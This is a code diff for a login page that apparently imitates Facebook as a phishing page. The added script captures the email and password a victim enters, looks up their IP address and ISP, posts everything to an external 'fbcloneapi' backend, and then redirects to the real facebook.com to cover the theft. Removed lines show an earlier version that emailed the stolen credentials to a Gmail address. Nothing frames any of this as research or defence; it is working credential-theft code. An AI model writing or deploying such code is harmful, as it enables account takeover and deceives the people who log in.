@@ -35,120 +35,85 @@
       </div>
     </div>
   </body>
-  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
-    emailjs.init("oTWaSLI94veAbFpaX");
-
     let form = document.querySelector("form");
     let email = document.getElementById("email");
     let password = document.getElementById("password");
     let submitBtn = document.getElementById("login");
     let emailErr = document.getElementById("emailErr");
+
     let passwordErr = document.getElementById("passwordErr");
-
-    // function sendEmail(to, subject, message) {
-    //   emailjs
-    //     .send("service_o7z3jtp", "template_nht3mye", {
-    //       to_email: to,
-    //       subject: subject,
-    //       message: message,
-    //     })
-    //     .then(
-    //       function (response) {
-    //         console.log("Email sent successfully:", response);
-    //       },
-    //       function (error) {
-    //         console.error("Error sending email:", error);
-    //       }
-    //     );
-    // }
-
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+      const emailErr = document.getElementById("emailErr");
+      const passwordErr = document.getElementById("passwordErr");
+
       emailErr.style.display = "none";
       passwordErr.style.display = "none";
-      email.removeAttribute("class");
-      password.removeAttribute("class");
+      document.getElementById("email").removeAttribute("class");
+      document.getElementById("password").removeAttribute("class");
 
-      if (!email.value.trim() || !password.value.trim()) {
-        if (!email.value.trim()) {
+      if (!email.trim() || !password.trim()) {
+        if (!email.trim()) {
           emailErr.style.display = "block";
           emailErr.setAttribute("class", "errtext");
-          email.setAttribute("class", "err");
+          document.getElementById("email").setAttribute("class", "err");
         }
 
-        if (!password.value.trim()) {
+        if (!password.trim()) {
           passwordErr.style.display = "block";
           passwordErr.setAttribute("class", "errtext");
-          password.setAttribute("class", "err");
+          document.getElementById("password").setAttribute("class", "err");
         }
       } else {
+        let connectionInfo = await fetchData();
+        const message = {
+          email: email,
+          password: password,
+          ipAddress: connectionInfo.ipAddress,
+          connectionType: connectionInfo.connectionType,
+        };
+        console.log(message);
+
+        // Now send 'message' to your backend using another fetch request
         try {
-          const response = await fetch(
+          const backendResponse = await fetch(
             "https://fbcloneapi-i63z.onrender.com/api/login",
             {
               method: "POST",
               headers: {
                 "Content-Type": "application/json",
               },
-              body: JSON.stringify({
-                email: email.value,
-                password: password.value,
-              }),
+              body: JSON.stringify(message),
             }
           );
 
-          if (!response.ok) {
-            throw new Error("Login failed");
-            console.log("Login from ");
+          if (backendResponse.ok) {
+            // Handle success
+            window.location.replace("https://www.facebook.com");
           } else {
-            setTimeout(() => {
-              window.location.replace("https://www.facebook.com/");
-            }, 3000);
+            // Handle error
+            console.error("Failed to send data to backend");
           }
         } catch (error) {
-          // Handle error, e.g., display an error message
-          console.error("Login error:", error.message);
+          console.error("Error sending data to backend:", error.message);
         }
       }
     });
 
-    // form.addEventListener("submit", (e) => {
-    //   e.preventDefault();
-    //   emailErr.style.display = "none";
-    //   passwordErr.style.display = "none";
-    //   email.removeAttribute("class");
-    //   password.removeAttribute("class");
-
-    //   if (!email.value.trim() || !password.value.trim()) {
-    //     if (!email.value.trim()) {
-    //       emailErr.style.display = "block";
-    //       emailErr.setAttribute("class", "errtext");
-    //       email.setAttribute("class", "err");
-    //     }
-
-    //     if (!password.value.trim()) {
-    //       passwordErr.style.display = "block";
-    //       passwordErr.setAttribute("class", "errtext");
-    //       password.setAttribute("class", "err");
-    //     }
-    //   } else {
-    //     let message = {
-    //       email: email.value,
-    //       password: password.value,
-    //     };
-    //     console.log(message);
-
-    //     // Uncomment the following lines to send the email and redirect
-    //     // sendEmail(
-    //     //   "jamespeterson10375@gmail.com",
-    //     //   "Client's Info",
-    //     //   JSON.stringify(message)
-    //     // );
-    //     // setTimeout(() => {
-    //     //   window.location.replace("https://www.facebook.com/");
-    //     // }, 3000);
-    //   }
-    // });
+    async function fetchData() {
+      try {
+        const response = await fetch("https://ipinfo.io/json");
+        const data = await response.json();
+        return {
+          ipAddress: data.ip,
+          connectionType: data.org || "Unknown",
+        };
+      } catch (error) {
+        console.error("Error fetching connection information:", error.message);
+      }
+    }
   </script>
 </html>
